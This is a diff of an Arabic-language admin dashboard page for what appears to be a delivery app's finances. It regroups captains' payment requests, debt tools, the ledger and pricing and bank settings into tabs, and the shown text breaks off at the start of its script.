+        <div class="page-header-actions">
             <a href="admin-debt-history.html" class="btn-brand" style="text-decoration:none;">
-                <i class="fas fa-history"></i> سجل تعديلات المديونية
+                <i class="fas fa-history"></i> سجل المديونيات
             </a>
-            <a href="admin-settlements.html" class="btn-brand" style="text-decoration:none;">
-                <i class="fas fa-hand-holding-usd"></i> تسويات مستحقات التجار
+            <a href="admin-settlements.html" class="btn-brand" style="text-decoration:none;background:linear-gradient(135deg,#3b82f6,#1d4ed8);">
+                <i class="fas fa-hand-holding-usd"></i> تسويات التجار
             </a>
         </div>
     </div>
 
-    <!-- KPI Cards -->
+    <!-- ── KPI METRICS GRID ──────────────────────────── -->
     <div class="kpi-grid">
         <div class="kpi-card green">
-            <div class="kpi-icon green"><i class="fas fa-check-circle"></i></div>
-            <div class="kpi-label">طلبات سداد معلقة</div>
+            <div class="kpi-top">
+                <span class="kpi-label">طلبات سداد معلقة</span>
+                <div class="kpi-icon green"><i class="fas fa-clock"></i></div>
+            </div>
             <div class="kpi-value" id="kpiPending">—</div>
         </div>
         <div class="kpi-card red">
-            <div class="kpi-icon red"><i class="fas fa-user-lock"></i></div>
-            <div class="kpi-label">كباتن محجوبون</div>
+            <div class="kpi-top">
+                <span class="kpi-label">كباتن محجوبون</span>
+                <div class="kpi-icon red"><i class="fas fa-user-lock"></i></div>
+            </div>
             <div class="kpi-value" id="kpiBlocked">—</div>
         </div>
         <div class="kpi-card orange">
-            <div class="kpi-icon orange"><i class="fas fa-exclamation-triangle"></i></div>
-            <div class="kpi-label">كباتن في منطقة التحذير</div>
+            <div class="kpi-top">
+                <span class="kpi-label">في منطقة التحذير (80%+)</span>
+                <div class="kpi-icon orange"><i class="fas fa-exclamation-triangle"></i></div>
+            </div>
             <div class="kpi-value" id="kpiWarning">—</div>
         </div>
         <div class="kpi-card blue">
-            <div class="kpi-icon blue"><i class="fas fa-coins"></i></div>
-            <div class="kpi-label">إجمالي عمولات محصّلة</div>
+            <div class="kpi-top">
+                <span class="kpi-label">إجمالي العمولات المحصلة</span>
+                <div class="kpi-icon blue"><i class="fas fa-coins"></i></div>
+            </div>
             <div class="kpi-value" id="kpiRevenue">—</div>
         </div>
     </div>
 
-    <!-- ── GLOBAL SETTINGS ─────────────────────── -->
-    <div class="section-card">
-        <div class="section-card-header">
-            <h2><i class="fas fa-cog"></i> إعدادات النظام المالي</h2>
-            <span style="font-size:12px;color:var(--muted);">تُطبّق فوراً على كل الكباتن الجدد</span>
-        </div>
-        <div class="section-card-body">
-            <div class="settings-grid">
-                <div class="field-group">
-                    <label class="field-label">نسبة عمولة التطبيق (%)</label>
-                    <input type="number" id="settingCommission" class="field-input" min="0" max="100" step="0.5" placeholder="مثال: 20">
-                    <span class="field-hint">تُخصم تلقائياً من محفظة الكابتن بعد كل توصيل</span>
-                </div>
-                <div class="field-group">
-                    <label class="field-label">الحد الافتراضي للمديونية (ج.س)</label>
-                    <input type="number" id="settingCreditLimit" class="field-input" max="0" step="100" placeholder="مثال: -5000">
-                    <span class="field-hint">يجب أن يكون سالبًا. عند تجاوزه يُوقف حساب الكابتن</span>
+    <!-- ── EXECUTIVE TAB NAVIGATION ───────────────────── -->
+    <div class="nav-tabs-wrapper">
+        <button class="tab-btn active" onclick="switchTab('payments', this)">
+            <i class="fas fa-file-invoice-dollar"></i> طلبات السداد الإشعارات <span id="tab-badge-pending" class="badge bg-warning text-dark ms-1" style="display:none;">0</span>
+        </button>
+        <button class="tab-btn" onclick="switchTab('debts', this)">
+            <i class="fas fa-user-shield"></i> المحجوبون والمديونيات
+        </button>
+        <button class="tab-btn" onclick="switchTab('ledger', this)">
+            <i class="fas fa-book"></i> كشف الحساب المالي
+        </button>
+        <button class="tab-btn" onclick="switchTab('settings', this)">
+            <i class="fas fa-sliders-h"></i> التسعيرة وإعدادات النظام
+        </button>
+    </div>
+
+    <!-- ========================================================= -->
+    <!-- TAB 1: PAYMENT REQUESTS                                  -->
+    <!-- ========================================================= -->
+    <div id="tab-payments" class="tab-content active">
+        <div class="section-card">
+            <div class="section-card-header">
+                <h2><i class="fas fa-receipt"></i> طلبات إثبات السداد</h2>
+                <div style="display:flex;gap:12px;align-items:center;flex-wrap:wrap;">
+                    <div class="search-box">
+                        <i class="fas fa-search"></i>
+                        <input type="text" id="paymentsSearchInput" placeholder="بحث باسم الكابتن أو الهاتف..." onkeyup="filterPaymentsTable()">
+                    </div>
+                    <div class="filter-pills">
+                        <div class="pill active" id="pill-pending"  onclick="setFilter('pending')">معلّق <span id="badge-pending" class="ms-1"></span></div>
+                        <div class="pill"        id="pill-approved" onclick="setFilter('approved')">مقبول</div>
+                        <div class="pill"        id="pill-rejected" onclick="setFilter('rejected')">مرفوض</div>
+                        <div class="pill"        id="pill-all"      onclick="setFilter('')">الكل</div>
+                        <button class="pill" style="background:var(--bg);" onclick="loadPaymentRequests()">
+                            <i class="fas fa-sync-alt"></i>
+                        </button>
+                    </div>
                 </div>
             </div>
-            <div style="margin-top:24px;">
-                <button class="btn-brand" id="saveSettingsBtn" onclick="saveFinancialSettings()">
-                    <i class="fas fa-save"></i> حفظ الإعدادات المالية
-                </button>
+            <div class="table-wrap">
+                <table class="pay-table">
+                    <thead>
+                        <tr>
+                            <th>الكابتن</th>
+                            <th>الرصيد الحالي</th>
+                            <th>المبلغ المسدد</th>
+                            <th>رقم الإشعار</th>
+                            <th>الإيصال</th>
+                            <th>الحالة</th>
+                            <th>التاريخ</th>
+                            <th class="text-center">الإجراءات</th>
+                        </tr>
+                    </thead>
+                    <tbody id="paymentsTableBody">
+                        <tr class="loading-row">
+                            <td colspan="8">
+                                <i class="fas fa-circle-notch spin" style="font-size:24px;color:var(--primary);"></i>
+                                <br><span style="font-size:13px;margin-top:8px;display:block;">جاري تحميل البيانات...</span>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
             </div>
         </div>
     </div>
 
-    <!-- ── PRICING SETTINGS ──────────────────────────── -->
-    <div class="section-card">
-        <div class="section-card-header">
-            <h2><i class="fas fa-calculator"></i> تسعيرة التوصيل</h2>
-            <span style="font-size:12px;color:var(--muted);">تُطبَّق على المدينة المختارة أعلاه — تؤثر مباشرة على حساب السعر للعميل</span>
-        </div>
-        <div class="section-card-body">
-            <div style="background:#fff8f0;border:1px solid #fed7aa;border-radius:12px;padding:14px 18px;margin-bottom:20px;font-size:13px;color:#92400e;">
-                <i class="fas fa-exclamation-triangle" style="margin-left:6px;"></i>
-                التغيير في التسعيرة يؤثر فوراً على أسعار الطلبات الجديدة. تأكد من القيم قبل الحفظ.
+    <!-- ========================================================= -->
+    <!-- TAB 2: BLOCKED & INDEBTED CAPTAINS                        -->
+    <!-- ========================================================= -->
+    <div id="tab-debts" class="tab-content">
+        
+        <!-- DEBT ADJUSTMENT TOOL -->
+        <div class="section-card">
+            <div class="section-card-header">
+                <h2><i class="fas fa-sliders-h"></i> إدارة وتعديل مديونية كابتن يدوياً</h2>
+                <span style="font-size:12px;color:var(--muted);">تصفير / تخفيض / إضافة مديونية من قِبل الإدارة</span>
             </div>
-            <div class="settings-grid">
-                <div class="field-group">
-                    <label class="field-label">سعر فتح العداد (ج.س)</label>
-                    <input type="number" id="settingBaseFare" class="field-input" min="0" step="50" placeholder="مثال: 1000">
-                    <span class="field-hint">يُضاف دائماً بغض النظر عن المسافة</span>
-                </div>
-                <div class="field-group">
-                    <label class="field-label">سعر الكيلومتر (ج.س)</label>
-                    <input type="number" id="settingCostPerKm" class="field-input" min="0" step="10" placeholder="مثال: 200">
-                    <span class="field-hint">يُضرب في المسافة بالكيلومتر</span>
-                </div>
-                <div class="field-group">
-                    <label class="field-label">سعر الدقيقة (ج.س)</label>
-                    <input type="number" id="settingCostPerMinute" class="field-input" min="0" step="5" placeholder="مثال: 25">
-                    <span class="field-hint">يُضرب في وقت الرحلة بالدقائق</span>
-                </div>
-            </div>
-            <div style="background:#f0f9f4;border:1px solid #a7f3d0;border-radius:12px;padding:14px 18px;margin-top:16px;margin-bottom:20px;">
-                <div style="font-weight:700;font-size:13px;color:#065f46;margin-bottom:8px;"><i class="fas fa-calculator" style="margin-left:6px;"></i> معادلة الحساب التلقائي:</div>
-                <code style="font-size:13px;color:#047857;direction:ltr;display:block;text-align:left;">
-                    السعر = فتح العداد + (الكيلومترات × سعر/كم) + (الدقائق × سعر/دقيقة)
-                </code>
-            </div>
-            <div style="margin-top:24px;">
-                <button class="btn-brand" id="savePricingBtn" onclick="savePricingSettings()" style="background:linear-gradient(135deg,#7c3aed,#5b21b6);box-shadow:0 4px 15px rgba(124,58,237,0.35);">
-                    <i class="fas fa-save"></i> حفظ التسعيرة
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <!-- ── BANK DETAILS ────────────────────────── -->
-    <div class="section-card">
-        <div class="section-card-header">
-            <h2><i class="fas fa-university"></i> بيانات حساب البنك</h2>
-            <span style="font-size:12px;color:var(--muted);">تظهر للكابتن في محفظته عند السداد</span>
-        </div>
-        <div class="section-card-body">
-            <div class="settings-grid">
-                <div class="field-group">
-                    <label class="field-label">اسم البنك للسداد</label>
-                    <input type="text" id="settingBankName" class="field-input" placeholder="مثال: بنك الخرطوم">
-                    <span class="field-hint">البنك الذي سيحول إليه الكابتن (يظهر في المحفظة)</span>
-                </div>
-                <div class="field-group">
-                    <label class="field-label">اسم صاحب الحساب</label>
-                    <input type="text" id="settingBankAccountName" class="field-input" placeholder="مثال: إدارة تطبيق وجيز">
-                </div>
-                <div class="field-group">
-                    <label class="field-label">رقم الحساب</label>
-                    <input type="text" id="settingBankAccountNumber" class="field-input" placeholder="مثال: 1234567">
-                </div>
-            </div>
-            <div style="margin-top:24px;">
-                <button class="btn-brand" id="saveBankBtn" onclick="saveBankDetails()"
-                    style="background: linear-gradient(135deg,#1a73e8,#0d5bba);">
-                    <i class="fas fa-save"></i> حفظ بيانات البنك
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <!-- ── PAYMENT REQUESTS ────────────────────── -->
-    <div class="section-card">
-        <div class="section-card-header">
-            <h2><i class="fas fa-file-invoice-dollar"></i> طلبات إثبات السداد</h2>
-            <div class="filter-pills">
-                <div class="pill active" id="pill-pending"  onclick="setFilter('pending')">معلّق <span id="badge-pending" class="ms-1"></span></div>
-                <div class="pill"        id="pill-approved" onclick="setFilter('approved')">مقبول</div>
-                <div class="pill"        id="pill-rejected" onclick="setFilter('rejected')">مرفوض</div>
-                <div class="pill"        id="pill-all"      onclick="setFilter('')">الكل</div>
-                <button class="pill" style="background:#f0f4f8;" onclick="loadPaymentRequests()">
-                    <i class="fas fa-sync-alt"></i>
-                </button>
-            </div>
-        </div>
-        <div class="table-wrap">
-            <table class="pay-table">
-                <thead>
-                    <tr>
-                        <th>الكابتن</th>
-                        <th>الرصيد الحالي</th>
-                        <th>المبلغ المسدد</th>
-                        <th>رقم الإشعار</th>
-                        <th>الإيصال</th>
-                        <th>الحالة</th>
-                        <th>التاريخ</th>
-                        <th class="text-center">الإجراءات</th>
-                    </tr>
-                </thead>
-                <tbody id="paymentsTableBody">
-                    <tr class="loading-row">
-                        <td colspan="8">
-                            <i class="fas fa-circle-notch spin" style="font-size:22px;"></i>
-                            <br><span style="font-size:13px;margin-top:8px;display:block;">جاري تحميل البيانات...</span>
-                        </td>
-                    </tr>
-                </tbody>
-            </table>
-        </div>
-    </div>
-
-    <!-- ── BLOCKED CAPTAINS ────────────────────── -->
-    <div class="section-card">
-        <div class="section-card-header">
-            <h2><i class="fas fa-user-lock"></i> الكباتن المحجوبون</h2>
-            <button class="btn-brand" style="font-size:13px;padding:9px 20px;" onclick="loadBlockedCaptains()">
-                <i class="fas fa-sync-alt"></i> تحديث
-            </button>
-        </div>
-        <div class="table-wrap">
-            <table class="pay-table">
-                <thead>
-                    <tr>
-                        <th>الكابتن</th>
-                        <th>رصيد المحفظة</th>
-                        <th>الحد الائتماني</th>
-                        <th>الحالة</th>
-                        <th class="text-center">رفع الحجب يدوياً</th>
-                    </tr>
-                </thead>
-                <tbody id="blockedTableBody">
-                    <tr class="loading-row">
-                        <td colspan="5">
-                            <i class="fas fa-circle-notch spin" style="font-size:22px;"></i>
-                        </td>
-                    </tr>
-                </tbody>
-            </table>
-        </div>
-    </div>
-
-    <!-- ── DEBT MANAGEMENT TOOL ──────────────────── -->
-    <div class="section-card">
-        <div class="section-card-header">
-            <h2><i class="fas fa-sliders-h"></i> إدارة مديونية كابتن يدوياً</h2>
-            <span style="font-size:12px;color:var(--muted);">تصفير / تخفيض / إضافة دين من قِبل الإدارة</span>
-        </div>
-        <div class="section-card-body">
-
-            <!-- ――― REDUCE / ZERO ――― -->
-            <div style="background:#f0fdf4;border:1px solid #bbf7d0;border-radius:14px;padding:20px;margin-bottom:20px;">
-                <div style="font-size:13px;font-weight:800;color:#15803d;margin-bottom:16px;display:flex;align-items:center;gap:8px;">
-                    <i class="fas fa-arrow-up-right-dots"></i> تسوية / تخفيض مديونية كابتن
-                </div>
-                <div class="settings-grid" style="align-items:end;">
-                    <div class="field-group">
-                        <label class="field-label">اختر الكابتن المدين</label>
-                        <select id="debtCaptainSelect" class="field-input" onchange="onDebtCaptainChange()">
-                            <option value="">— اختر كابتن —</option>
-                        </select>
+            <div class="section-card-body">
+                <div class="row g-4">
+                    <!-- REDUCE / ZERO DEBT -->
+                    <div class="col-md-6">
+                        <div style="background:rgba(34,197,94,0.06);border:1px solid rgba(34,197,94,0.2);border-radius:var(--radius-md);padding:20px;height:100%;">
+                            <div style="font-size:14px;font-weight:800;color:#15803d;margin-bottom:16px;display:flex;align-items:center;gap:8px;">
+                                <i class="fas fa-arrow-down"></i> تسوية / تخفيض مديونية كابتن
+                            </div>
+                            <div class="field-group mb-3">
+                                <label class="field-label">اختر الكابتن المدين</label>
+                                <select id="debtCaptainSelect" class="field-input" onchange="onDebtCaptainChange()">
+                                    <option value="">— اختر كابتن —</option>
+                                </select>
+                            </div>
+                            <div class="row g-2 mb-3">
+                                <div class="col-6">
+                                    <label class="field-label">الرصيد الحالي</label>
+                                    <input type="text" id="debtCurrentBalance" class="field-input" readonly placeholder="—" style="font-weight:800;color:var(--danger);">
+                                </div>
+                                <div class="col-6">
+                                    <label class="field-label">مبلغ التخفيض (ج.س)</label>
+                                    <input type="number" id="debtPartialAmount" class="field-input" min="1" step="100" placeholder="مثال: 500">
+                                </div>
+                            </div>
+                            <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:10px;">
+                                <button class="btn-brand" onclick="adjustDebt('zero')" style="background:var(--danger-gradient);box-shadow:0 4px 14px rgba(239,68,68,0.25);">
+                                    <i class="fas fa-times-circle"></i> تصفير المديونية
+                                </button>
+                                <button class="btn-brand" onclick="adjustDebt('partial')">
+                                    <i class="fas fa-minus-circle"></i> تخفيض جزئي
+                                </button>
+                            </div>
+                        </div>
                     </div>
-                    <div class="field-group">
-                        <label class="field-label">الرصيد الحالي</label>
-                        <input type="text" id="debtCurrentBalance" class="field-input" readonly placeholder="—" style="background:#f8fafc;color:var(--danger);font-weight:800;">
-                    </div>
-                    <div class="field-group">
-                        <label class="field-label">المبلغ المراد تخفيضه (ج.س)</label>
-                        <input type="number" id="debtPartialAmount" class="field-input" min="1" step="100" placeholder="مثال: 500">
-                        <span class="field-hint">اتركه فارغاً إذا أردت التصفير الكامل</span>
+
+                    <!-- ADD DEBT -->
+                    <div class="col-md-6">
+                        <div style="background:rgba(245,158,11,0.06);border:1px solid rgba(245,158,11,0.2);border-radius:var(--radius-md);padding:20px;height:100%;">
+                            <div style="font-size:14px;font-weight:800;color:#c2410c;margin-bottom:16px;display:flex;align-items:center;gap:8px;">
+                                <i class="fas fa-plus-circle"></i> إضافة مديونية يدوياً لكابتن
+                            </div>
+                            <div class="field-group mb-3">
+                                <label class="field-label">اختر الكابتن</label>
+                                <select id="addDebtCaptainSelect" class="field-input" onchange="onAddDebtCaptainChange()">
+                                    <option value="">— اختر كابتن —</option>
+                                </select>
+                            </div>
+                            <div class="row g-2 mb-3">
+                                <div class="col-6">
+                                    <label class="field-label">الرصيد الحالي</label>
+                                    <input type="text" id="addDebtCurrentBalance" class="field-input" readonly placeholder="—" style="font-weight:800;">
+                                </div>
+                                <div class="col-6">
+                                    <label class="field-label">المبلغ (ج.س)</label>
+                                    <input type="number" id="addDebtAmount" class="field-input" min="1" step="100" placeholder="مثال: 200">
+                                </div>
+                            </div>
+                            <div class="field-group mb-3">
+                                <label class="field-label">السبب (اختياري)</label>
+                                <input type="text" id="addDebtNote" class="field-input" placeholder="مثال: مخالفة, غرامة تأخير...">
+                            </div>
+                            <button class="btn-brand" onclick="addDebt()" style="background:var(--warning-gradient);box-shadow:0 4px 14px rgba(245,158,11,0.25);">
+                                <i class="fas fa-plus-circle"></i> إضافة المديونية
+                            </button>
+                        </div>
                     </div>
                 </div>
-                <div style="display:flex;gap:12px;margin-top:18px;flex-wrap:wrap;">
-                    <button class="btn-brand" onclick="adjustDebt('zero')"
-                        style="background:linear-gradient(135deg,#ef4444,#dc2626);">
-                        <i class="fas fa-times-circle"></i> تصفير المديونية بالكامل
-                    </button>
-                    <button class="btn-brand" onclick="adjustDebt('partial')">
-                        <i class="fas fa-minus-circle"></i> تخفيض جزء من المديونية
-                    </button>
-                </div>
             </div>
-
-            <!-- ――― ADD DEBT ――― -->
-            <div style="background:#fff7ed;border:1px solid #fed7aa;border-radius:14px;padding:20px;">
-                <div style="font-size:13px;font-weight:800;color:#c2410c;margin-bottom:16px;display:flex;align-items:center;gap:8px;">
-                    <i class="fas fa-arrow-down"></i> إضافة مديونية يدوياً لكابتن
-                </div>
-                <div class="settings-grid" style="align-items:end;">
-                    <div class="field-group">
-                        <label class="field-label">اختر الكابتن</label>
-                        <select id="addDebtCaptainSelect" class="field-input" onchange="onAddDebtCaptainChange()">
-                            <option value="">— اختر كابتن —</option>
-                        </select>
-                    </div>
-                    <div class="field-group">
-                        <label class="field-label">رصيده الحالي</label>
-                        <input type="text" id="addDebtCurrentBalance" class="field-input" readonly placeholder="—" style="background:#f8fafc;font-weight:800;">
-                    </div>
-                    <div class="field-group">
-                        <label class="field-label">مبلغ المديونية المراد إضافتها (ج.س)</label>
-                        <input type="number" id="addDebtAmount" class="field-input" min="1" step="100" placeholder="مثال: 200">
-                    </div>
-                    <div class="field-group">
-                        <label class="field-label">سبب المديونية (اختياري)</label>
-                        <input type="text" id="addDebtNote" class="field-input" placeholder="مثال: مخالفة, غرامة, خسارة...">
-                    </div>
-                </div>
-                <div style="margin-top:18px;">
-                    <button class="btn-brand" onclick="addDebt()"
-                        style="background:linear-gradient(135deg,#f97316,#ea580c);">
-                        <i class="fas fa-plus-circle"></i> إضافة مديونية للكابتن
-                    </button>
-                </div>
-            </div>
-
         </div>
-    </div>
 
-    <!-- ── INDEBTED CAPTAINS ────────────────────────── -->
-    <div class="section-card">
-        <div class="section-card-header">
-            <h2><i class="fas fa-hand-holding-usd"></i> الكباتن المدينون</h2>
-            <button class="btn-brand" style="font-size:13px;padding:9px 20px;" onclick="loadIndebtedCaptains()">
-                <i class="fas fa-sync-alt"></i> تحديث
-            </button>
-        </div>
-        <div class="table-wrap">
-            <table class="pay-table">
-                <thead>
-                    <tr>
-                        <th>الكابتن</th>
-                        <th>رصيد المحفظة</th>
-                        <th>الحد الائتماني</th>
-                        <th>نسبة الاستهلاك</th>
-                        <th>الحالة</th>
-                        <th class="text-center">تسوية المديونية</th>
-                    </tr>
-                </thead>
-                <tbody id="indebtedTableBody">
-                    <tr class="loading-row">
-                        <td colspan="6">
-                            <i class="fas fa-circle-notch spin" style="font-size:22px;"></i>
-                        </td>
-                    </tr>
-                </tbody>
-            </table>
-        </div>
-    </div>
-
-    <!-- ── FINANCIAL LEDGER ──────────────────────────── -->
-    <div class="section-card">
-        <div class="section-card-header">
-            <h2><i class="fas fa-book"></i> كشف الحساب المالي</h2>
-            <div style="display:flex;gap:10px;flex-wrap:wrap;align-items:center;">
-                <select id="ledgerCityFilter" class="field-input" style="width:auto;padding:8px 14px;font-size:13px;" onchange="loadLedger()">
-                    <option value="">كل المدن</option>
-                    <option value="Khartoum">الخرطوم</option>
-                    <option value="PortSudan">بورتسودان</option>
-                </select>
-                <input type="date" id="ledgerFrom" class="field-input" style="width:auto;padding:8px 14px;font-size:13px;" onchange="loadLedger()">
-                <input type="date" id="ledgerTo" class="field-input" style="width:auto;padding:8px 14px;font-size:13px;" onchange="loadLedger()">
-                <button class="btn-brand" style="font-size:13px;padding:9px 18px;" onclick="loadLedger()">
+        <!-- BLOCKED CAPTAINS LIST -->
+        <div class="section-card">
+            <div class="section-card-header">
+                <h2><i class="fas fa-user-lock"></i> الكباتن المحجوبون</h2>
+                <button class="btn-brand" style="font-size:13px;padding:8px 18px;" onclick="loadBlockedCaptains()">
                     <i class="fas fa-sync-alt"></i> تحديث
                 </button>
             </div>
+            <div class="table-wrap">
+                <table class="pay-table">
+                    <thead>
+                        <tr>
+                            <th>الكابتن</th>
+                            <th>رصيد المحفظة</th>
+                            <th>الحد الائتماني</th>
+                            <th>الحالة والنسبة</th>
+                            <th class="text-center">إجراء الإدارة</th>
+                        </tr>
+                    </thead>
+                    <tbody id="blockedTableBody">
+                        <tr class="loading-row"><td colspan="5"><i class="fas fa-circle-notch spin" style="font-size:20px;"></i></td></tr>
+                    </tbody>
+                </table>
+            </div>
         </div>
-        <div class="table-wrap">
-            <table class="pay-table">
-                <thead>
-                    <tr>
-                        <th>النوع</th>
-                        <th>التاريخ</th>
-                        <th>الكابتن</th>
-                        <th>المدينة</th>
-                        <th>المبلغ</th>
-                        <th>البيان</th>
-                    </tr>
-                </thead>
-                <tbody id="ledgerTableBody">
-                    <tr class="loading-row"><td colspan="6"><i class="fas fa-circle-notch spin" style="font-size:22px;"></i></td></tr>
-                </tbody>
-            </table>
+
+        <!-- INDEBTED CAPTAINS LIST -->
+        <div class="section-card">
+            <div class="section-card-header">
+                <h2><i class="fas fa-hand-holding-usd"></i> قائمة الكباتن المدينين</h2>
+                <button class="btn-brand" style="font-size:13px;padding:8px 18px;" onclick="loadIndebtedCaptains()">
+                    <i class="fas fa-sync-alt"></i> تحديث
+                </button>
+            </div>
+            <div class="table-wrap">
+                <table class="pay-table">
+                    <thead>
+                        <tr>
+                            <th>الكابتن</th>
+                            <th>رصيد المحفظة</th>
+                            <th>الحد الائتماني</th>
+                            <th>نسبة الاستهلاك</th>
+                            <th>الحالة</th>
+                            <th class="text-center">تسوية المديونية</th>
+                        </tr>
+                    </thead>
+                    <tbody id="indebtedTableBody">
+                        <tr class="loading-row"><td colspan="6"><i class="fas fa-circle-notch spin" style="font-size:20px;"></i></td></tr>
+                    </tbody>
+                </table>
+            </div>
         </div>
+
+    </div>
+
+    <!-- ========================================================= -->
+    <!-- TAB 3: FINANCIAL LEDGER                                  -->
+    <!-- ========================================================= -->
+    <div id="tab-ledger" class="tab-content">
+        <div class="section-card">
+            <div class="section-card-header">
+                <h2><i class="fas fa-book"></i> كشف الحساب المالي العام</h2>
+                <div style="display:flex;gap:10px;flex-wrap:wrap;align-items:center;">
+                    <select id="ledgerCityFilter" class="field-input" style="width:auto;padding:8px 14px;font-size:13px;" onchange="loadLedger()">
+                        <option value="">كل المدن</option>
+                        <option value="Khartoum">الخرطوم</option>
+                        <option value="PortSudan">بورتسودان</option>
+                    </select>
+                    <input type="date" id="ledgerFrom" class="field-input" style="width:auto;padding:8px 14px;font-size:13px;" onchange="loadLedger()">
+                    <input type="date" id="ledgerTo" class="field-input" style="width:auto;padding:8px 14px;font-size:13px;" onchange="loadLedger()">
+                    <button class="btn-brand" style="font-size:13px;padding:8px 18px;" onclick="loadLedger()">
+                        <i class="fas fa-sync-alt"></i> تحديث
+                    </button>
+                </div>
+            </div>
+            <div class="table-wrap">
+                <table class="pay-table">
+                    <thead>
+                        <tr>
+                            <th>النوع</th>
+                            <th>التاريخ</th>
+                            <th>الكابتن</th>
+                            <th>المدينة</th>
+                            <th>المبلغ</th>
+                            <th>البيان</th>
+                        </tr>
+                    </thead>
+                    <tbody id="ledgerTableBody">
+                        <tr class="loading-row"><td colspan="6"><i class="fas fa-circle-notch spin" style="font-size:20px;"></i></td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========================================================= -->
+    <!-- TAB 4: SYSTEM & PRICING SETTINGS                         -->
+    <!-- ========================================================= -->
+    <div id="tab-settings" class="tab-content">
+        
+        <!-- SYSTEM COMMISSION SETTINGS -->
+        <div class="section-card">
+            <div class="section-card-header">
+                <h2><i class="fas fa-cog"></i> إعدادات نظام المحفظة والعمولة</h2>
+                <span style="font-size:12px;color:var(--muted);">تُطبق فوراً على الكباتن في المدينة المختارة</span>
+            </div>
+            <div class="section-card-body">
+                <div class="settings-grid">
+                    <div class="field-group">
+                        <label class="field-label">نسبة عمولة التطبيق (%)</label>
+                        <input type="number" id="settingCommission" class="field-input" min="0" max="100" step="0.5" placeholder="مثال: 15">
+                        <span class="field-hint">تُخصم تلقائياً من محفظة الكابتن بعد كل توصيل</span>
+                    </div>
+                    <div class="field-group">
+                        <label class="field-label">الحد الافتراضي للمديونية (ج.س)</label>
+                        <input type="number" id="settingCreditLimit" class="field-input" max="0" step="100" placeholder="مثال: -5000">
+                        <span class="field-hint">يجب أن يكون سالبًا. عند تجاوزه يُوقف حساب الكابتن تلقائياً</span>
+                    </div>
+                </div>
+                <div style="margin-top:24px;">
+                    <button class="btn-brand" id="saveSettingsBtn" onclick="saveFinancialSettings()">
+                        <i class="fas fa-save"></i> حفظ الإعدادات المالية
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- PRICING CALCULATOR SETTINGS -->
+        <div class="section-card">
+            <div class="section-card-header">
+                <h2><i class="fas fa-calculator"></i> تسعيرة التوصيل للمدينة</h2>
+                <span style="font-size:12px;color:var(--muted);">تؤثر مباشرة على حساب سعر الطلبات الجديدة للعملاء</span>
+            </div>
+            <div class="section-card-body">
+                <div style="background:rgba(245,158,11,0.08);border:1px solid rgba(245,158,11,0.3);border-radius:12px;padding:14px 18px;margin-bottom:20px;font-size:13px;color:#92400e;display:flex;align-items:center;gap:10px;">
+                    <i class="fas fa-exclamation-circle" style="font-size:18px;"></i>
+                    تنبيه: التغيير في التسعيرة يؤثر فوراً على جميع الرحلات الجديدة التي يتم طلبها.
+                </div>
+                <div class="settings-grid">
+                    <div class="field-group">
+                        <label class="field-label">سعر فتح العداد (ج.س)</label>
+                        <input type="number" id="settingBaseFare" class="field-input" min="0" step="50" placeholder="مثال: 1000">
+                        <span class="field-hint">يُضاف دائماً كرسوم أساسية لكل رحلة</span>
+                    </div>
+                    <div class="field-group">
+                        <label class="field-label">سعر الكيلومتر (ج.س)</label>
+                        <input type="number" id="settingCostPerKm" class="field-input" min="0" step="10" placeholder="مثال: 200">
+                        <span class="field-hint">يُضرب في مسافة المسار بالكيلومترات</span>
+                    </div>
+                    <div class="field-group">
+                        <label class="field-label">سعر الدقيقة (ج.س)</label>
+                        <input type="number" id="settingCostPerMinute" class="field-input" min="0" step="5" placeholder="مثال: 25">
+                        <span class="field-hint">يُضرب في زمن التوصيل المتوقع بالدقائق</span>
+                    </div>
+                </div>
+                <div style="background:rgba(4,140,91,0.06);border:1px solid rgba(4,140,91,0.2);border-radius:12px;padding:14px 18px;margin-top:20px;margin-bottom:20px;">
+                    <div style="font-weight:700;font-size:13px;color:var(--primary);margin-bottom:6px;"><i class="fas fa-calculator me-1"></i> معادلة الاحتساب في السيرفر:</div>
+                    <code style="font-size:13px;color:var(--primary-dark);direction:ltr;display:block;text-align:left;">
+                        Total Price = BaseFare + (DistanceKm × CostPerKm) + (DurationMin × CostPerMin)
+                    </code>
+                </div>
+                <div style="margin-top:24px;">
+                    <button class="btn-brand" id="savePricingBtn" onclick="savePricingSettings()" style="background:linear-gradient(135deg,#7c3aed,#5b21b6);box-shadow:0 4px 15px rgba(124,58,237,0.3);">
+                        <i class="fas fa-save"></i> حفظ التسعيرة
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- BANK DETAILS SETTINGS -->
+        <div class="section-card">
+            <div class="section-card-header">
+                <h2><i class="fas fa-university"></i> بيانات الحساب البنكي للسداد</h2>
+                <span style="font-size:12px;color:var(--muted);">تظهر للكباتن في محفظة التطبيق عند إرسال السداد</span>
+            </div>
+            <div class="section-card-body">
+                <div class="settings-grid">
+                    <div class="field-group">
+                        <label class="field-label">اسم البنك</label>
+                        <input type="text" id="settingBankName" class="field-input" placeholder="مثال: بنك الخرطوم (بنكك)">
+                    </div>
+                    <div class="field-group">
+                        <label class="field-label">اسم صاحب الحساب</label>
+                        <input type="text" id="settingBankAccountName" class="field-input" placeholder="مثال: شركة وجيز للتطبيقات المحدودة">
+                    </div>
+                    <div class="field-group">
+                        <label class="field-label">رقم الحساب أو الآيبان</label>
+                        <input type="text" id="settingBankAccountNumber" class="field-input" placeholder="مثال: 1234567">
+                    </div>
+                </div>
+                <div style="margin-top:24px;">
+                    <button class="btn-brand" id="saveBankBtn" onclick="saveBankDetails()" style="background:linear-gradient(135deg,#1a73e8,#0d5bba);">
+                        <i class="fas fa-save"></i> حفظ بيانات البنك
+                    </button>
+                </div>
+            </div>
+        </div>
+
     </div>
 
 </div><!-- /page-wrap -->
@@ -674,7 +906,7 @@
 <script src="vendor/bootstrap/bootstrap.bundle.min.js"></script>
 <script>
 // ──────────────────────────────────────────
-// AUTH GUARD
+// AUTH GUARD & CONFIG
 // ──────────────────────────────────────────
 const adminToken = localStorage.getItem('adminToken');
 let userObj = null;
@@ -684,38 +916,83 @@ if (!adminToken || !userObj || userObj.role !== 'admin') window.location.href = 
 const API = (typeof API_URL !== 'undefined') ? API_URL : 'https://wajeezsd.com';
